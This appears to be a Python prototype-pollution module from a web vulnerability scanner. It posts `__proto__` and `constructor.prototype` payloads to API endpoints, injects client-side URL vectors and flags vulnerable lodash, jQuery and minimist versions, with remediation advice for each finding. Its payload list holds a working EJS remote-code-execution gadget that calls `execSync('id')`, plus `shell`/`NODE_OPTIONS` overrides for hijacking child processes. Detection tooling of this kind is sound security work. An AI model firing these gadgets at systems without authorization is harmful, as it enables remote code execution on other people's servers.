"""
Prototype Pollution Detection Module

Tests for:
1. Server-side prototype pollution (Node.js/Express)
   - JSON merge/deep-extend via __proto__, constructor.prototype
2. Client-side prototype pollution
   - URL fragment/query parameter injection
   - DOM property pollution
3. Gadget detection for exploitation (RCE via status, body, env)
"""
import asyncio
import json
import logging
from urllib.parse import urlparse

import httpx

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)

# Server-side payloads: inject properties via __proto__
SERVER_PAYLOADS = [
    # Classic __proto__ pollution
    {"__proto__": {"polluted": "pHnT0m_pp"}},
    {"constructor": {"prototype": {"polluted": "pHnT0m_pp"}}},
    # Nested merge pollution
    {"a": {"__proto__": {"polluted": "pHnT0m_pp"}}},
    # Overwrite status code (if Express uses Object.assign for options)
    {"__proto__": {"status": 510, "statusCode": 510}},
    # Overwrite shell command (RCE gadget)
    {"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--inspect"}},
    # Express/EJS RCE gadget
    {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id')//"}},
]

# Client-side pollution vectors (URL-based)
CLIENT_VECTORS = [
    "__proto__[polluted]=pHnT0m_pp",
    "__proto__.polluted=pHnT0m_pp",
    "constructor[prototype][polluted]=pHnT0m_pp",
    "constructor.prototype.polluted=pHnT0m_pp",
]

# Indicators that pollution worked
POLLUTION_INDICATORS = [
    "pHnT0m_pp",
    '"polluted"',
]

# Status codes that indicate server-side pollution worked
POLLUTED_STATUS_CODES = {510, 501, 418}


class PrototypePollutionModule:
    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def check(self, context: dict, db) -> list[dict]:
        endpoints = context.get("endpoints", [])
        base_url = context.get("base_url", "")
        auth_cookie = context.get("auth_cookie")
        technologies = context.get("technologies", {})
        findings = []

        headers = {}
        if auth_cookie:
            if auth_cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {auth_cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = auth_cookie

        # Detect if target is Node.js/Express
        tech_summary = technologies.get("summary", {})
        tech_str = " ".join(str(k).lower() for k in tech_summary.keys())
        is_node = any(t in tech_str for t in ("node", "express", "next", "nuxt", "koa", "fastify"))

        async with make_client(extra_headers=headers) as client:
            # Server-side prototype pollution (prioritize if Node.js detected)
            server_findings = await self._check_server_side(client, base_url, endpoints, prioritize=is_node)
            findings.extend(server_findings)

            # Client-side prototype pollution via URL params
            client_findings = await self._check_client_side(client, base_url, endpoints)
            findings.extend(client_findings)

            # Check for known vulnerable libraries
            lib_findings = await self._check_vulnerable_libs(client, base_url, endpoints)
            findings.extend(lib_findings)

        return findings

    async def _check_server_side(self, client, base_url, endpoints, prioritize=False) -> list[dict]:
        """Test JSON endpoints for server-side prototype pollution."""
        findings = []

        # Find JSON-accepting endpoints (POST/PUT/PATCH)
        json_endpoints = []
        for ep in endpoints:
            if isinstance(ep, str):
                url = ep
                method = "GET"
            else:
                url = ep.get("url", "")
                method = ep.get("method", "GET")

            if method in ("POST", "PUT", "PATCH") or "/api/" in url.lower():
                json_endpoints.append({"url": url, "method": method})

        # Also test base API paths
        for path in ["/api/settings", "/api/config", "/api/profile", "/api/user",
                     "/api/preferences", "/api/update"]:
            json_endpoints.append({"url": f"{base_url}{path}", "method": "POST"})

        limit = 15 if prioritize else 8
        for ep in json_endpoints[:limit]:
            url = ep["url"]
            method = ep["method"]

            for payload in SERVER_PAYLOADS:
                try:
                    async with self.rate_limit:
                        if method == "PATCH":
                            resp = await client.patch(url, json=payload)
                        elif method == "PUT":
                            resp = await client.put(url, json=payload)
                        else:
                            resp = await client.post(url, json=payload)

                        body = resp.text

                        # Check 1: Our marker appeared in response
                        if "pHnT0m_pp" in body:
                            severity = "critical" if "outputFunctionName" in json.dumps(payload) else "high"
                            findings.append({
                                "title": f"Server-Side Prototype Pollution: {urlparse(url).path}",
                                "url": url,
                                "severity": severity,
                                "vuln_type": "rce" if severity == "critical" else "misconfig",
                                "payload": json.dumps(payload),
                                "method": method,
                                "impact": "Server-side prototype pollution confirmed. "
                                         "Attacker can modify Object.prototype affecting all objects. "
                                         "May lead to RCE via gadget chains (EJS, Pug, Handlebars).",
                                "remediation": "Use Object.create(null) for merge targets. "
                                              "Filter __proto__ and constructor from user input. "
                                              "Use Map instead of plain objects.",
                            })
                            return findings

                        # Check 2: Status code changed to our injected value
                        if resp.status_code in POLLUTED_STATUS_CODES:
                            findings.append({
                                "title": f"Prototype Pollution (Status Overwrite): {urlparse(url).path}",
                                "url": url,
                                "severity": "high",
                                "vuln_type": "misconfig",
                                "payload": json.dumps(payload),
                                "injected_status": resp.status_code,
                                "impact": f"Server returned status {resp.status_code} after __proto__ injection. "
                                         "Indicates server-side prototype pollution.",
                                "remediation": "Sanitize __proto__ from all JSON input before processing.",
                            })
                            return findings

                except Exception:
                    continue

        return findings

    async def _check_client_side(self, client, base_url, endpoints) -> list[dict]:
        """Test for client-side prototype pollution via URL parameters."""
        findings = []

        test_urls = [base_url]
        for ep in endpoints[:10]:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if url and not url.lower().startswith(base_url.lower() + "/api/"):
                test_urls.append(url)

        for url in test_urls[:8]:
            for vector in CLIENT_VECTORS:
                try:
                    separator = "&" if "?" in url else "?"
                    test_url = f"{url}{separator}{vector}"

                    async with self.rate_limit:
                        resp = await client.get(test_url)
                        body = resp.text

                        # Check if the page includes JavaScript that reads our polluted property
                        if "pHnT0m_pp" in body:
                            # Check if it's reflected in a script context (actual pollution)
                            # vs just reflected in HTML (which would be XSS)
                            in_script = ("polluted" in body.lower() and
                                        ("<script" in body.lower() or "application/javascript" in body.lower()))

                            if in_script:
                                findings.append({
                                    "title": f"Client-Side Prototype Pollution: {urlparse(url).path}",
                                    "url": test_url,
                                    "severity": "medium",
                                    "vuln_type": "xss_dom",
                                    "payload": vector,
                                    "impact": "Client-side prototype pollution via URL parameters. "
                                             "Can be chained with DOM XSS gadgets for script execution.",
                                    "remediation": "Use Object.freeze(Object.prototype). "
                                                  "Sanitize user input used in object operations.",
                                })
                                return findings

                except Exception:
                    continue

        return findings

    async def _check_vulnerable_libs(self, client, base_url, endpoints) -> list[dict]:
        """Check for known vulnerable JavaScript libraries (lodash, jQuery, etc.)."""
        findings = []
        vulnerable_patterns = {
            "lodash": {
                "pattern": r"lodash(?:\.min)?\.js",
                "vuln_versions": ["4.17.11", "4.17.10", "4.17.4", "4.17.2", "3."],
                "cve": "CVE-2019-10744",
            },
            "jquery": {
                "pattern": r"jquery(?:\.min)?\.js",
                "vuln_versions": ["1.", "2.", "3.0", "3.1", "3.2", "3.3"],
                "cve": "CVE-2019-11358",
            },
            "minimist": {
                "pattern": r"minimist",
                "vuln_versions": ["0.", "1.0", "1.1", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "1.2.4", "1.2.5"],
                "cve": "CVE-2020-7598",
            },
        }

        try:
            async with self.rate_limit:
                resp = await client.get(base_url)
                body = resp.text

                for lib, info in vulnerable_patterns.items():
                    import re
                    matches = re.findall(info["pattern"], body, re.IGNORECASE)
                    if matches:
                        # Try to find version
                        version_pattern = rf'{lib}[/@]v?(\d+\.\d+\.\d+)'
                        ver_match = re.search(version_pattern, body, re.IGNORECASE)
                        version = ver_match.group(1) if ver_match else "unknown"

                        is_vuln = version == "unknown" or any(version.startswith(v) for v in info["vuln_versions"])
                        if is_vuln:
                            findings.append({
                                "title": f"Vulnerable Library: {lib} {version}",
                                "url": base_url,
                                "severity": "medium",
                                "vuln_type": "misconfig",
                                "library": lib,
                                "version": version,
                                "cve": info["cve"],
                                "impact": f"{lib} {version} is vulnerable to prototype pollution ({info['cve']}). "
                                         "Attacker may pollute Object.prototype via crafted input.",
                                "remediation": f"Update {lib} to the latest version.",
                            })

        except Exception:
            pass

        return findings
